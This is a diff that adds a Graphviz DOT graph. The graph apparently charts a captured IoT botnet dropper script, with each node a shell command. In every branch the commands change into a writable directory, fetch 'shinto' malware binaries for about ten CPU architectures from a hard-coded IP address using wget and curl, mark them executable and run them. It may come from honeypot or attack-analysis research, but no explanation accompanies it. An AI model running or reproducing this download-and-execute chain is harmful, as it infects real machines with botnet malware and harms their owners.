@@ -1,0 +1,220 @@
+digraph {
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 10 [label="||,"];
+10 [label="wget http://104.244.73.53/3MaF4G/shinto.x86 "];
+10 -> 12 [label=";,"];
+12 [label="curl -O http://104.244.73.53/3MaF4G/shinto.x86 "];
+12 -> 14 [label=";,"];
+14 [label="cat shinto.x86 AbAC ssh "];
+14 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 32 [label="||,"];
+32 [label="wget http://104.244.73.53/3MaF4G/shinto.mips "];
+32 -> 34 [label=";,"];
+34 [label="curl -O http://104.244.73.53/3MaF4G/shinto.mips "];
+34 -> 36 [label=";,"];
+36 [label="cat shinto.mips AbAC ssh "];
+36 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 54 [label="||,"];
+54 [label="wget http://104.244.73.53/3MaF4G/shinto.mpsl "];
+54 -> 56 [label=";,"];
+56 [label="curl -O http://104.244.73.53/3MaF4G/shinto.mpsl "];
+56 -> 58 [label=";,"];
+58 [label="cat shinto.mpsl AbAC ssh "];
+58 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 76 [label="||,"];
+76 [label="wget http://104.244.73.53/3MaF4G/shinto.arm4 "];
+76 -> 78 [label=";,"];
+78 [label="curl -O http://104.244.73.53/3MaF4G/shinto.arm4 "];
+78 -> 80 [label=";,"];
+80 [label="cat shinto.arm4 AbAC ssh "];
+80 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 98 [label="||,"];
+98 [label="wget http://104.244.73.53/3MaF4G/shinto.arm5 "];
+98 -> 100 [label=";,"];
+100 [label="curl -O http://104.244.73.53/3MaF4G/shinto.arm5 "];
+100 -> 102 [label=";,"];
+102 [label="cat shinto.arm5 AbAC ssh "];
+102 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 120 [label="||,"];
+120 [label="wget http://104.244.73.53/3MaF4G/shinto.arm6 "];
+120 -> 122 [label=";,"];
+122 [label="curl -O http://104.244.73.53/3MaF4G/shinto.arm6 "];
+122 -> 124 [label=";,"];
+124 [label="cat shinto.arm6 AbAC ssh "];
+124 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 142 [label="||,"];
+142 [label="wget http://104.244.73.53/3MaF4G/shinto.arm7 "];
+142 -> 144 [label=";,"];
+144 [label="curl -O http://104.244.73.53/3MaF4G/shinto.arm7 "];
+144 -> 146 [label=";,"];
+146 [label="cat shinto.arm7 AbAC ssh "];
+146 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 164 [label="||,"];
+164 [label="wget http://104.244.73.53/3MaF4G/shinto.ppc "];
+164 -> 166 [label=";,"];
+166 [label="curl -O http://104.244.73.53/3MaF4G/shinto.ppc "];
+166 -> 168 [label=";,"];
+168 [label="cat shinto.ppc AbAC ssh "];
+168 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 186 [label="||,"];
+186 [label="wget http://104.244.73.53/3MaF4G/shinto.m68k "];
+186 -> 188 [label=";,"];
+188 [label="curl -O http://104.244.73.53/3MaF4G/shinto.m68k "];
+188 -> 190 [label=";,"];
+190 [label="cat shinto.m68k AbAC ssh "];
+190 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+217 [label="./AbAC ssh "];
+217 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 208 [label="||,"];
+208 [label="wget http://104.244.73.53/3MaF4G/shinto.sh4 "];
+208 -> 210 [label=";,"];
+210 [label="curl -O http://104.244.73.53/3MaF4G/shinto.sh4 "];
+210 -> 212 [label=";,"];
+212 [label="cat shinto.sh4 AbAC ssh "];
+212 -> 214 [label=";,"];
+214 [label="AbAC "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 217 [label=";,"];
+}
